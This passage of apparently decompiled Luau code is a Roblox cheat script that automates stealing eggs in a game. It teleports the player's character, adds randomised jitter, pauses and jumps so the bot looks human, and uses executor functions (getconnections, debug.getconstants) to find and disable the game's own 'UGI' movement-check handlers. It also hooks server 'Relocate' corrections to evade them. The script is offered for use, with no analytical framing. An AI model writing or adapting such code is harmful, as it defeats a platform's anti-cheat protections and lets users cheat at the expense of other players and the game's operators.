if arg:IsA("BasePart") then
return arg.CFrame, arg.Size
end
end)
if ok and result and result2 then
local n21 = Vector3.new(math.abs(result2.X), 0, math.abs(result2.Z)) * 0.5
local v20 = (result - result.Position):VectorToWorldSpace(n21)
local x = n21.X
local z = n21.Z
local n22 = math.max(math.abs(v20.X), x, z)
local x2 = n21.X
local z2 = n21.Z
local n23 = math.max(math.abs(v20.Z), x2, z2)
table.insert(dangers, {
MinX = result.Position.X - n22,
MaxX = result.Position.X + n22,
MinZ = result.Position.Z - n23,
MaxZ = result.Position.Z + n23,
Name = arg.Name,
})
end
end
local function fn56(arg)
if arg == "ScrambleLocalVisuals" or arg == "DrScrambleEvent" then
return false
end
local v20 = string.lower(arg)
return string.find(v20, "portal", 1, true) or string.find(v20, "teleport", 1, true) or string.find(v20, "mech", 1, true) or string.find(v20, "arena", 1, true) or string.find(v20, "scramble", 1, true)
end
for _, child in ipairs(workspace:GetChildren()) do
if (child:IsA("Model") or child:IsA("BasePart") or child:IsA("Folder")) and fn56(child.Name) then
if child:IsA("Folder") then
for _, child2 in ipairs(child:GetChildren()) do
fn55(child2)
end
else
fn55(child)
end
end
end
local world = workspace:FindFirstChild("World")
world = world and world:FindFirstChild("Build")
if world then
for _, child in ipairs(world:GetChildren()) do
if fn56(child.Name) then
for _, child2 in ipairs(child:GetChildren()) do
fn55(child2)
end
end
end
end
safeCarry.Dangers = dangers
return dangers
end
tbl4.SafeCarry.Avoid = function(arg, arg2)
for _, v20 in ipairs(tbl4.SafeCarry.RefreshDangers()) do
local n21 = v20.MinX - 12
local n22 = v20.MaxX + 12
local n23 = v20.MinZ - 12
local n24 = v20.MaxZ + 12
local v21, v22, v23 = ipairs({ { arg.X, arg2.X - arg.X, n21, n22 }, { arg.Z, arg2.Z - arg.Z, n23, n24 } })
local flag3 = true
local n25 = 0
local n26 = 1
for _, v24 in v21, v22, v23 do
local v25 = v24[1]
local v26 = v24[2]
local v27 = v24[3]
local v28 = v24[4]
if math.abs(v26) < 1e-06 then
if v25 < v27 or v25 > v28 then
flag3 = false
end
else
local n27 = (v27 - v25) / v26
local n28 = (v28 - v25) / v26
if not (n28 < n27) then
local v29 = n28
n28 = n27
n27 = v29
end
local n29 = math.max(n25, n28)
local n30 = math.min(n26, n27)
if not (n30 < n29) then
n26 = n30
n25 = n29
else
flag3 = false
n26 = n30
n25 = n29
end
end
end
if flag3 and not (arg.X >= n21 and arg.X <= n22 and arg.Z >= n23 and arg.Z <= n24) then
local n27 = n23 - 2
local n28 = n24 + 2
local flag4 = math.abs(arg.Z - n27) <= math.abs(arg.Z - n28) and n27 or n28
if flag4 < -440 or flag4 > -290 then
flag4 = flag4 == n27 and n28 or n27
end
local flag5 = math.abs(arg.X - n21) <= math.abs(arg.X - n22) and n21 or n22
if math.abs(arg.Z - flag4) < 3 then
flag5 = math.abs(arg2.X - n21) <= math.abs(arg2.X - n22) and n21 or n22
end
return Vector3.new(flag5, arg2.Y, flag4), v20.Name
end
end
return arg2, nil
end
tbl4.SafeCarry.NewHuman = function(arg)
local safeCarry = tbl4.SafeCarry
local laneOffset = safeCarry.LaneOffset
local tbl35
tbl35 = {
Clock = 0,
Factor = 1,
Target = 1,
NextShift = 0,
Phase = math.random() * 3.1415926535897931 * 2,
Period = 2 + math.random() * 2.5,
PauseUntil = 0,
Lane = (math.random() * 2 - 1) * laneOffset,
Step = function(arg2, arg3, arg4)
tbl35.Clock = tbl35.Clock + arg2
if tbl35.NextShift <= tbl35.Clock then
tbl35.NextShift = tbl35.Clock + 0.5 + math.random()
local n21 = math.max(safeCarry.SpeedJitter, 0)
if arg then
tbl35.Target = 1 - math.random() * n21
else
tbl35.Target = 1 + (math.random() * 2 - 1) * n21
end
end
tbl35.Factor = tbl35.Factor + (tbl35.Target - tbl35.Factor) * math.min(arg2 * 3, 1)
local wobble = safeCarry.Wobble
local n21 = math.sin(tbl35.Clock * 2 * 3.1415926535897931 / tbl35.Period + tbl35.Phase) * wobble
local flag3 = arg4 and arg3 and safeCarry.JumpsPerMinute > 0
local flag4
if flag3 then
local n22 = safeCarry.JumpsPerMinute / 60 * arg2
flag4 = math.random() < n22
else
flag4 = flag3
end
if flag4 then
pcall(function()
arg3.Jump = true
end)
end
local flag5 = false
if not arg then
if tbl35.Clock < tbl35.PauseUntil then
flag5 = true
else
local flag6 = safeCarry.PausesPerMinute > 0
if flag6 then
local n22 = safeCarry.PausesPerMinute / 60 * arg2
flag6 = math.random() < n22
end
if flag6 then
tbl35.PauseUntil = tbl35.Clock + 0.3 + math.random() * 0.9
flag5 = true
end
end
end
return tbl35.Factor, tbl35.Lane + n21, flag5
end,
}
return tbl35
end
tbl4.SafeCarry.React = function(arg, arg2)
local n21 = math.max(0, math.min(arg, arg2))
local n22 = math.max(arg, arg2, 0)
return n21 + math.random() * (n22 - n21)
end
tbl4.SafeCarry.RunTo = function(arg, arg2)
local safeCarry = tbl4.SafeCarry
local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
if not position then
return false
end
fn23()
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid then
humanoid.PlatformStand = false
if character:FindFirstChildWhichIsA("Tool") then
pcall(function()
humanoid:UnequipTools()
end)
end
end
local v20 = safeCarry.NewHuman(false)
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
local areas = world and world:FindFirstChild("Areas")
areas = areas and areas:FindFirstChild("SeparationLine")
local x = areas and areas:IsA("BasePart") and areas.Position.X or 552
local v21 = stealHome()
local position2 = tbl4.Root()
local str4 = "field"
local z = position2 and position2.Position.Z or position.Z
if position2 and v21 and position2.Position.X < x - 2 then
z = v21.Z
if (Vector3.new(position2.Position.X, 0, position2.Position.Z) - Vector3.new(v21.X, 0, v21.Z)).Magnitude > 20 then
str4 = "safe"
end
end
local n21 = math.clamp(z + v20.Lane, -425, -300)
local n22 = position.Y + 3
local function fn55(arg3)
local v22 = tbl4.Root()
local character2 = localPlayer.Character
local flag3 = not v22 or not character2 or math.abs(v22.Position.Y - arg3) < 1
if not flag3 then
local snapLimit = safeCarry.SnapLimit
flag3 = math.abs(v22.Position.Y - arg3) > snapLimit
end
if flag3 then
return false
end
pcall(function()
local rotation = v22.CFrame.Rotation
character2:PivotTo(CFrame.new(Vector3.new(v22.Position.X, arg3, v22.Position.Z)) * rotation)
v22.AssemblyLinearVelocity = Vector3.new(v22.AssemblyLinearVelocity.X, 0, v22.AssemblyLinearVelocity.Z)
end)
return true
end
local function fn56()
if safeCarry.RunHeight <= 0.5 then
return
end
fn55(n22 + safeCarry.RunHeight)
end
if str4 == "field" then
fn56()
end
local now = os.clock()
local now2 = os.clock()
local now3 = os.clock()
position2 = position2 and position2.Position or nil
local function fn57(arg3, arg4, arg5, arg6)
local vector = Vector3.new(arg4.X - arg3.Position.X, 0, arg4.Z - arg3.Position.Z)
local magnitude = vector.Magnitude
local unit = magnitude > 0.01 and vector.Unit or Vector3.zero
if safeCarry.RunHeight > 0.5 and str4 == "field" and not arg6 then
local runSpeed = safeCarry.RunSpeed
local n23 = math.max(tbl4.WalkSpeed() * runSpeed * arg5, 8)
local n24 = math.clamp(safeCarry.ClimbShare, 0.1, 0.9)
local magnitude2 = Vector3.new(position.X - arg3.Position.X, 0, position.Z - arg3.Position.Z).Magnitude
if magnitude2 <= 3 then
if fn55(n22) then
return
end
end
local n25 = magnitude2 <= 3 and n22 or n22 + safeCarry.RunHeight
if math.abs(n25 - arg3.Position.Y) > 2 and fn55(n25) then
return
end
local n26 = math.clamp((n25 - arg3.Position.Y) / 0.12, -n23 * n24, n23 * n24)
local n27 = unit * math.min(math.sqrt(math.max(n23 * n23 - n26 * n26, 0)), magnitude / 0.05)
pcall(function()
arg3.AssemblyLinearVelocity = Vector3.new(n27.X, n26, n27.Z)
end)
return
end
pcall(function()
if arg6 or magnitude <= 0.01 then
if humanoid then
if safeCarry.RunStyle == "Walk" then
humanoid:MoveTo(arg3.Position)
end
humanoid:Move(Vector3.zero, false)
end
if safeCarry.RunStyle ~= "Walk" then
arg3.AssemblyLinearVelocity = Vector3.new(0, arg3.AssemblyLinearVelocity.Y, 0)
end
elseif safeCarry.RunStyle == "Walk" then
if humanoid then
humanoid:MoveTo(arg3.Position + unit * math.min(magnitude, 30))
end
else
local runSpeed = safeCarry.RunSpeed
local n23 = unit * math.min(math.max(tbl4.WalkSpeed() * runSpeed * arg5, 8), magnitude / 0.05)
arg3.AssemblyLinearVelocity = Vector3.new(n23.X, arg3.AssemblyLinearVelocity.Y, n23.Z)
if safeCarry.RunAnimate and humanoid then
humanoid:Move(unit, false)
end
end
end)
end
while os.clock() - now < 240 do
if fn14(arg2) then
return false
end
local v22 = tbl4.Root()
if not v22 then
return false
end
local now4 = os.clock()
local n23 = math.max(now4 - now2, 0.0041666666666666666)
local vector = Vector3.new(position.X - v22.Position.X, 0, position.Z - v22.Position.Z)
if str4 == "field" and vector.Magnitude <= 2.5 and (safeCarry.RunHeight <= 0.5 or v22.Position.Y - n22 < 4) then
break
end
local v23, v24, flag3 = v20.Step(n23, humanoid, humanoid and humanoid.FloorMaterial ~= Enum.Material.Air)
if vector.Magnitude <= 15 then
flag3 = false
end
local vector2 = position
if str4 == "safe" and v21 then
if (Vector3.new(v21.X, 0, v21.Z) - Vector3.new(v22.Position.X, 0, v22.Position.Z)).Magnitude <= 6 then
str4 = "field"
fn56()
end
str3 = "Walking out to the safe zone"
vector2 = v21
else
if not safeCarry.StraightRun and safeCarry.RunHeight <= 0.5 and math.abs(position.X - v22.Position.X) > 25 then
vector2 = Vector3.new(position.X, position.Y, math.clamp(n21 + v24, -425, -300))
end
str3 = string.format("Running to the egg, %d studs left", math.floor(vector.Magnitude + 0.5))
end
local v25, v26 = safeCarry.Avoid(v22.Position, vector2)
if v26 then
str3 = "Walking around " .. tostring(v26)
end
fn57(v22, v25, v23, flag3)
if now4 - now3 >= 1.5 then
if not flag3 and position2 and (v22.Position - position2).Magnitude < 3 and humanoid then
pcall(function()
humanoid.Jump = true
end)
end
position2 = v22.Position
now3 = now4
end
RunService.Heartbeat:Wait()
now2 = now4
end
local v22 = tbl4.Root()
if v22 then
fn57(v22, v22.Position, 1, true)
end
local vector = nil
if v22 then
local vector2 = Vector3.new(v22.Position.X - position.X, 0, v22.Position.Z - position.Z)
local vector3 = vector2.Magnitude > 0.1 and vector2.Unit * 2 or Vector3.zero
vector = Vector3.new(position.X + vector3.X, v22.Position.Y, position.Z + vector3.Z)
end
local connection = RunService.Heartbeat:Connect(function()
local v23 = tbl4.Root()
if not v23 or not vector or tbl4.Steal.Carrying or tbl4.AntiGuard.Busy then
return
end
local vector2 = Vector3.new(vector.X - v23.Position.X, 0, vector.Z - v23.Position.Z)
pcall(function()
if vector2.Magnitude > 1.5 then
local rotation = v23.CFrame.Rotation
v23.CFrame = CFrame.new(vector.X, v23.Position.Y, vector.Z) * rotation
end
v23.AssemblyLinearVelocity = Vector3.new(0, math.min(v23.AssemblyLinearVelocity.Y, 0), 0)
end)
end)
local function fn58(arg3)
connection:Disconnect()
return arg3
end
local v23 = fn43(arg)
local now4 = os.clock()
local v24 = safeCarry.React(safeCarry.ReactMin, safeCarry.ReactMax)
while true do
if fn14(arg2) then
return (fn58(false))
else
local n23 = os.clock() - now4
local n24 = safeCarry.RunWait + v24
local flag3 = not safeCarry.WaitGuard or not v23 or v23:GetAttribute("GuardState") == "Sleeping"
if n23 >= n24 and (flag3 or n23 >= n24 + 15) then
break
end
str3 = n23 < n24 and string.format("Waiting before the grab, %.1fs", n24 - n23) or "Waiting for the guard to sleep"
RunService.Heartbeat:Wait()
end
end
str3 = "Taking the egg"
local v25 = fn45(arg, arg2, 0.8, nil)
if not v25 and not fn14(arg2) then
v25 = fn31(arg, arg2)
end
fn58()
if not v25 then
return false
end
tbl4.Steal.LastFinishedAt = os.clock()
return true
end
tbl4.SafeCarry.Pace = function()
local n21 = tonumber(tbl4.SafeCarry.RunSpeed) or 1
return math.max(tbl4.WalkSpeed() * n21, 16)
end
tbl4.SafeCarry.Plan = function(arg, arg2, arg3)
local safeCarry = tbl4.SafeCarry
local character = localPlayer.Character
if character then
character:FindFirstChildOfClass("Humanoid")
end
local v20 = tbl4.WalkSpeed()
arg3 = arg3 or safeCarry.Mult or 1
if safeCarry.SameSpeedBigEggs then
arg3 = math.max(arg3, safeCarry.LightMult)
end
local n21 = v20 * safeCarry.CarryRatio * arg3
local n22 = n21 * safeCarry.SpeedRatio
local n23 = safeCarry.ExcessSeconds * n21
local n24
if arg2 and arg2 > n23 then
n24 = math.min(n22, n21 * arg2 / (arg2 - n23))
else
n24 = n22
end
local guards = tbl.Guards
local flag3 = type(guards) == "table" and type(guards.Directory) == "table" and guards.Directory[tostring(arg)] or nil
local n25 = type(flag3) == "table" and tonumber(flag3.WalkSpeed) or 0
if not safeCarry.BeatGuard then
return math.max(math.min(n21 * safeCarry.EasyRatio, n24), n21), true, n21, n24, n25
end
local n26 = math.max(n25 + safeCarry.GuardMargin, n21 * safeCarry.MinRatio)
local n27 = math.max(n26, n25 * safeCarry.GuardRatio)
if n24 < n26 then
local n28 = n21 * safeCarry.SpeedRatio
local n29 = safeCarry.StretchSeconds * n21
local n30
if arg2 and arg2 > n29 then
n30 = math.min(n28, n21 * arg2 / (arg2 - n29))
else
n30 = n28
end
local n31 = n25 + math.max(safeCarry.GuardMargin, 1)
if n31 <= n30 then
return n31, true, n21, n30, n25
end
end
return math.max(math.min(n27, n24), n21), n26 <= n24, n21, n24, n25
end
tbl4.SafeCarry.Unsafe = function(arg)
local safeCarry = tbl4.SafeCarry
if not safeCarry.Enabled or type(arg) ~= "table" or not arg.Uid or not safeCarry.Blocked[arg.Uid] then
return nil
end
return string.format("the guard caught you with this %s before, skipping it", tostring(arg.Category))
end
tbl4.SafeCarry.Settle = function(arg, arg2)
local safeCarry = tbl4.SafeCarry
local character = localPlayer.Character
if character then
character:FindFirstChildOfClass("Humanoid")
end
math.max(tbl4.WalkSpeed() * safeCarry.CarryRatio * (safeCarry.Seen[tostring(arg2.Category)] or safeCarry.GuessMult) * safeCarry.WaitRate, 1)
local baseWait = safeCarry.BaseWait
local v20 = fn43(arg2)
while true do
if fn14(arg) then
return false
else
local n21 = os.clock() - (safeCarry.JumpAt or 0)
local flag3 = not safeCarry.WaitGuard or not v20 or v20:GetAttribute("GuardState") == "Sleeping"
if n21 >= baseWait and (flag3 or n21 >= baseWait + 15) then
break
end
if n21 < baseWait then
str3 = string.format("Letting the jump settle, %.1fs", baseWait - n21)
else
str3 = "Waiting for the guard to sleep"
end
RunService.Heartbeat:Wait()
end
end
return true
end
tbl4.MonitorAction = tbl4.MonitorAction or function(arg)
local ok, result = pcall(debug.getconstants, arg)
if not ok or type(result) ~= "table" then
return false
end
for _, v20 in pairs(result) do
local flag3 = type(v20) == "string"
if flag3 then
flag3 = v20 == "Relocate" or v20 == "SetWalkSpeed" or v20 == "BeginRagdoll" or v20 == "EndRagdoll" or v20 == "BeginImpulse"
end
if flag3 then
return true
end
end
return false
end
tbl4.SafeCarry.LineDropHome = function(arg)
local safeCarry = tbl4.SafeCarry
local steal = tbl4.Steal
local carryUid = steal.CarryUid
local v20 = stealHome()
local v21 = tbl4.Root()
if type(carryUid) ~= "string" or not v20 or not v21 then
return false
end
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
world = world and world:FindFirstChild("Areas")
world = world and world:FindFirstChild("SeparationLine")
local x = world and world:IsA("BasePart") and world.Position.X or 552.2
local y = world and world:IsA("BasePart") and world.Position.Y or 67.67
local tbl35 = {}
pcall(function()
for _, v22 in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
for _, v23 in ipairs(getconnections(v22)) do
local ok, result = pcall(function()
return v23.Function
end)
if ok and type(result) == "function" then
local ok2, result2 = pcall(debug.info, result, "s")
if ok2 and string.find(tostring(result2), "UGI", 1, true) and not tbl4.MonitorAction(result) then
local ok3, result3 = pcall(function()
return v23.Enabled
end)
if not ok3 or result3 ~= false then
if pcall(function()
v23:Disable()
end) then
table.insert(tbl35, v23)
end
end
end
end
end
end
end)
local flag3 = false
local connection = nil
pcall(function()
connection = networking["RE/RigSync/Refresh"].OnClientEvent:Connect(function(arg2)
if type(arg2) == "table" and arg2.Action == "Relocate" then
flag3 = true
end
end)
end)
local currentCamera = workspace.CurrentCamera
local tbl36 = nil
local function fn55()
if not safeCarry.LockCamera or tbl36 or not currentCamera then
return
end
tbl36 = { Type = currentCamera.CameraType, CFrame = currentCamera.CFrame }
pcall(function()
currentCamera.CameraType = Enum.CameraType.Scriptable
currentCamera.CFrame = tbl36.CFrame
end)
end
local function fn56()
if not tbl36 or not currentCamera then
return
end
local v22 = tbl36
tbl36 = nil
pcall(function()
currentCamera.CameraType = v22.Type
end)
end
local function fn57()
fn56()
if connection then
connection:Disconnect()
connection = nil
end
for _, v22 in ipairs(tbl35) do
pcall(function()
v22:Enable()
end)
end
table.clear(tbl35)
end
local now = os.clock()
local function fn58(arg2)
local v22 = tbl4.Root()
if not v22 then
return false
end
pcall(function()
local rotation = v22.CFrame.Rotation
v22.CFrame = CFrame.new(v20) * rotation
v22.AssemblyLinearVelocity = Vector3.zero
v22.AssemblyAngularVelocity = Vector3.zero
end)
local n21 = 0
while n21 < 1 and not fn14(arg) do
if arg2 and arg2() then
return true
end
n21 += RunService.Heartbeat:Wait()
end
return false
end
fn23()
local n21 = math.clamp(v21.Position.Z, -425, -300)
local vector = Vector3.new(x + (safeCarry.Hops and safeCarry.HopStop or safeCarry.LineGap), y + 3.35, n21)
local function fn59()
local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
local ok, result = pcall(function()
return rfEggWorldAskFieldEggSnapshot:InvokeServer()
end)
local records = ok and type(result) == "table" and result.Records or nil
if type(records) == "table" then
for _, record in pairs(records) do
if type(record) == "table" and record.Uid == carryUid then
return record
end
end
end
return nil
end
local function fn60()
local ok, result = pcall(function()
return localPlayer:GetNetworkPing()
end)
ok = ok and tonumber(result) or nil
return ok and math.clamp(ok, 0, 2) or 0.2
end
local function fn61(arg2)
local v22 = fn60()
if not arg2 then
local n22 = 0
while n22 < safeCarry.DropDelay + v22 and steal.Carrying and not fn14(arg) do
n22 += RunService.Heartbeat:Wait()
end
if not steal.Carrying then
return false
end
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
pcall(eggState.DropFieldEgg, "PlayerRequest")
end
local n23 = 0
while steal.Carrying and n23 < 1 + v22 * 2 and not fn14(arg) do
n23 += RunService.Heartbeat:Wait()
end
if steal.Carrying then
return true
end
end
local now2 = os.clock()
local position = nil
local flag4 = flag3 == true
local backRunRatio = safeCarry.BackRunRatio
local backRunMax = safeCarry.BackRunMax
local n22 = math.clamp(tbl4.WalkSpeed() * backRunRatio, 1200, backRunMax)
flag3 = false
local n23 = 0
local v23 = now2
while not steal.Carrying and not fn14(arg) do
local now3 = os.clock()
local v24 = workspace:FindFirstChild(carryUid)
local isModel = v24 and v24:IsA("Model")
local flag5 = false
local result = nil
if isModel then
flag5, result = pcall(v24.GetPivot, v24)
end
if flag5 and typeof(result) == "CFrame" then
position = result.Position
elseif now3 - n23 >= 1 then
position = fn49(carryUid) or position
n23 = now3
end
if now3 - now2 >= 0.5 and now3 - v23 >= 1 then
local v25 = fn59()
if v25 and v25.State == "Slot" then
str3 = "Line Drop: the egg went back to its nest"
return false
end
if not v25 and not position and now3 - now2 > 5 then
str3 = "Line Drop: the egg is gone"
return false
end
v23 = now3
end
if flag3 then
flag3 = false
flag4 = true
end
local v25 = tbl4.Root()
if v25 and position then
local vector2 = Vector3.new(position.X - v25.Position.X, 0, position.Z - v25.Position.Z)
local magnitude = vector2.Magnitude
if magnitude > 6 then
if flag4 then
str3 = string.format("Line Drop: running back to the egg, %d studs", math.floor(magnitude + 0.5))
local n24 = vector2.Unit * math.min(math.clamp(magnitude * 4, tbl4.WalkSpeed(), n22), magnitude / 0.05)
pcall(function()
v25.AssemblyLinearVelocity = Vector3.new(n24.X, v25.AssemblyLinearVelocity.Y, n24.Z)
end)
else
str3 = string.format("Line Drop: teleporting to the egg, %d studs", math.floor(magnitude + 0.5))
pcall(function()
v25.CFrame = CFrame.new(position + Vector3.new(0, 3, 0)) * CFrame.Angles(0, 1.5707963267948966, 0)
v25.AssemblyLinearVelocity = Vector3.zero
v25.AssemblyAngularVelocity = Vector3.zero
end)
end
else
str3 = "Line Drop: grabbing the egg back"
end
end
task.spawn(fn29, carryUid)
task.wait(0.05)
end
local v24 = tbl4.Root()
if v24 then
pcall(function()
v24.AssemblyLinearVelocity = Vector3.new(0, v24.AssemblyLinearVelocity.Y, 0)
end)
end
local flag5 = steal.Carrying and not steal.WrongEgg(carryUid)
if flag5 then
safeCarry.RegrabbedAt = os.clock()
end
return flag5
end
local magnitude = Vector3.new(v21.Position.X - x, 0, v21.Position.Z - n21).Magnitude
local max = math.max
local carryRatio = safeCarry.CarryRatio
local v22 = max(tbl4.WalkSpeed() * carryRatio * (tonumber(safeCarry.Mult) or safeCarry.LightMult), 1)
local directMargin = safeCarry.DirectMargin
local n22 = math.max(0, (magnitude - safeCarry.DirectBudget) / v22) + directMargin
if safeCarry.CrossNow then
n22 = safeCarry.DirectMargin
end
local function fn62()
local v23 = tbl4.Root()
if not v23 then
return
end
pcall(function()
v23.CFrame = CFrame.new(vector) * CFrame.Angles(0, 1.5707963267948966, 0)
v23.AssemblyLinearVelocity = Vector3.zero
v23.AssemblyAngularVelocity = Vector3.zero
end)
end
fn55()
if safeCarry.Hops then
local v23 = tbl4.Root()
if v23 then
local n23 = v23.Position.Y + safeCarry.HopLift
local x2 = v23.Position.X
local hopRatio = safeCarry.HopRatio
local n24 = math.max(tbl4.WalkSpeed() * hopRatio, 40)
local tbl37 = {}
local v24 = ipairs
local midDrops = safeCarry.MidDrops or {}
for _, midDrop in v24(midDrops) do
table.insert(tbl37, x2 - (x2 - vector.X) * midDrop)
end
local n25 = 1
while true do
local flag4 = x2 - n24 > vector.X
local flag5 = flag4 and not fn14(arg)
local exitTo = nil
local n26, v25
while flag5 do
local flag6, v26, v27, n27, flag7
if not steal.Carrying then
str3 = "Line Drop: the server dropped the egg, grabbing it back"
if fn61(true) then
local v28 = tbl4.Root()
if v28 then
x2 = v28.Position.X
end
if not (x2 - n24 <= vector.X) then
x2 -= n24
str3 = string.format("Line Drop: hopping home, X %d", math.floor(x2))
flag6 = tbl37[n25] and x2 <= tbl37[n25]
if flag6 then
n25 += 1
str3 = string.format("Line Drop: dropping and grabbing the egg again (%d/%d)", n25 - 1, #tbl37 + 1)
v26 = tbl4.Root()
if v26 then
pcall(function()
v26.CFrame = CFrame.new(x2, vector.Y, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
v26.AssemblyLinearVelocity = Vector3.zero
v26.AssemblyAngularVelocity = Vector3.zero
end)
end
if steal.Carrying then
if fn61() then
v27 = tbl4.Root()
if v27 then
x2 = v27.Position.X
end
n27 = 0
while true do
flag7 = n27 < safeCarry.MidRest and not fn14(arg)
if flag7 then
n27 += RunService.Heartbeat:Wait()
continue
end
break
end
n26 = 0
while n26 < safeCarry.HopGap do
v25 = tbl4.Root()
if v25 then
pcall(function()
v25.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
v25.AssemblyLinearVelocity = Vector3.zero
v25.AssemblyAngularVelocity = Vector3.zero
end)
end
n26 += RunService.Heartbeat:Wait()
end
flag4 = x2 - n24 > vector.X
flag5 = flag4 and not fn14(arg)
continue
end
else
n26 = 0
while n26 < safeCarry.HopGap do
v25 = tbl4.Root()
if v25 then
pcall(function()
v25.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
v25.AssemblyLinearVelocity = Vector3.zero
v25.AssemblyAngularVelocity = Vector3.zero
end)
end
n26 += RunService.Heartbeat:Wait()
end
flag4 = x2 - n24 > vector.X
flag5 = flag4 and not fn14(arg)
continue
end
else
exitTo = 2
break
end
end
end
else
x2 -= n24
str3 = string.format("Line Drop: hopping home, X %d", math.floor(x2))
flag6 = tbl37[n25] and x2 <= tbl37[n25]
if flag6 then
n25 += 1
str3 = string.format("Line Drop: dropping and grabbing the egg again (%d/%d)", n25 - 1, #tbl37 + 1)
v26 = tbl4.Root()
if v26 then
pcall(function()
v26.CFrame = CFrame.new(x2, vector.Y, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
v26.AssemblyLinearVelocity = Vector3.zero
v26.AssemblyAngularVelocity = Vector3.zero
end)
end
if steal.Carrying then
if fn61() then
v27 = tbl4.Root()
if v27 then
x2 = v27.Position.X
end
n27 = 0
while true do
flag7 = n27 < safeCarry.MidRest and not fn14(arg)
if flag7 then
n27 += RunService.Heartbeat:Wait()
continue
end
break
end
n26 = 0
while n26 < safeCarry.HopGap do
v25 = tbl4.Root()
if v25 then
pcall(function()
v25.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
v25.AssemblyLinearVelocity = Vector3.zero
v25.AssemblyAngularVelocity = Vector3.zero
end)
end
n26 += RunService.Heartbeat:Wait()
end
flag4 = x2 - n24 > vector.X
flag5 = flag4 and not fn14(arg)
continue
end
else
n26 = 0
while n26 < safeCarry.HopGap do
v25 = tbl4.Root()
if v25 then
pcall(function()
v25.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
v25.AssemblyLinearVelocity = Vector3.zero
v25.AssemblyAngularVelocity = Vector3.zero
end)
end
n26 += RunService.Heartbeat:Wait()
end
flag4 = x2 - n24 > vector.X
flag5 = flag4 and not fn14(arg)
continue
end
else
exitTo = 1
break
end
end
break
end
if exitTo == 1 then
n26 = 0
while n26 < safeCarry.HopGap do
v25 = tbl4.Root()
if v25 then
pcall(function()
v25.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
v25.AssemblyLinearVelocity = Vector3.zero
v25.AssemblyAngularVelocity = Vector3.zero
end)
end
n26 += RunService.Heartbeat:Wait()
end
continue
end
if exitTo == 2 then
n26 = 0
while n26 < safeCarry.HopGap do
v25 = tbl4.Root()
if v25 then
pcall(function()
v25.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
v25.AssemblyLinearVelocity = Vector3.zero
v25.AssemblyAngularVelocity = Vector3.zero
end)
end
n26 += RunService.Heartbeat:Wait()
end
continue
end
break
end
end
end
if safeCarry.Hops and not steal.Carrying and not fn14(arg) then
str3 = "Line Drop: the server dropped the egg, grabbing it back"
fn61(true)
end
str3 = "Line Drop: landing next to the line"
fn62()
local carrying = safeCarry.Hops and steal.Carrying
local flag4 = false
if carrying then
str3 = "Line Drop: dropping the egg next to the line"
local now2 = os.clock()
for i = 1, 8 do
if not (not fn61() or not steal.Carrying or fn14(arg)) then
local v23 = tbl4.Root()
if v23 and math.abs(v23.Position.X - vector.X) <= 30 then
flag4 = (safeCarry.RegrabbedAt or 0) >= now2
break
else
str3 = "Line Drop: back to the line with the egg"
fn62()
continue
end
end
break
end
end
fn56()
if flag4 and not fn14(arg) then
str3 = "Line Drop: stepping over the line"
fn58(function()
return safeCarry.LastDelivered >= now or not steal.Carrying
end)
local n23 = 0
while n23 < 2 and safeCarry.LastDelivered < now and steal.Carrying and not fn14(arg) do
n23 += RunService.Heartbeat:Wait()
end
if now <= safeCarry.LastDelivered then
fn57()
return true
end
end
if safeCarry.ShakeTime > 0 then
local vector2 = Vector3.new(x - safeCarry.ShakeInside, vector.Y, n21)
local flag5 = false
local n23 = 0
while n23 < safeCarry.ShakeTime and steal.Carrying and not fn14(arg) do
str3 = "Line Drop: shaking at the line"
flag5 = not flag5
local v23 = tbl4.Root()
if v23 then
pcall(function()
v23.CFrame = CFrame.new(flag5 and vector2 or vector) * CFrame.Angles(0, 1.5707963267948966, 0)
v23.AssemblyLinearVelocity = Vector3.zero
end)
end
n23 += RunService.Heartbeat:Wait()
end
fn62()
end
local flag5 = n22 < safeCarry.LineWait
local n23 = 0
local n24 = 1
while true do
local flag6 = steal.Carrying and n23 < safeCarry.LineWait
if flag6 then
flag6 = not (flag5 and n23 >= n22)
end
if flag6 and not fn14(arg) then
if flag5 then
str3 = string.format("Line Drop: stepping over the line in %.1fs", math.max(n22 - n23, 0))
else
str3 = string.format("Line Drop: crossing needs %.1fs, waiting for the guard, %.0fs left", n22, safeCarry.LineWait - n23)
end
if flag3 and safeCarry.ReJump and n24 < 40 and not fn32() then
flag3 = false
n24 += 1
str3 = "Line Drop: pulled back, jumping to the line again"
fn62()
end
n23 += RunService.Heartbeat:Wait()
continue
end
break
end
if steal.Carrying and flag5 and n23 >= n22 and not fn14(arg) then
str3 = "Line Drop: stepping over the line"
fn58(function()
return safeCarry.LastDelivered >= now or not steal.Carrying
end)
local n25 = 0
while n25 < 1.5 and safeCarry.LastDelivered < now and steal.Carrying and not fn14(arg) do
n25 += RunService.Heartbeat:Wait()
end
if now <= safeCarry.LastDelivered then
fn57()
return true
end
end
if steal.Carrying then
fn57()
str3 = "Line Drop: the guard never came, dropping the egg"
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
pcall(eggState.DropFieldEgg, "PlayerRequest")
end
return false
end
if safeCarry.GetUp then
task.spawn(function()
local n25 = 0
while n25 < 1.5 do
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid then
pcall(function()
humanoid.PlatformStand = false
local state = humanoid:GetState()
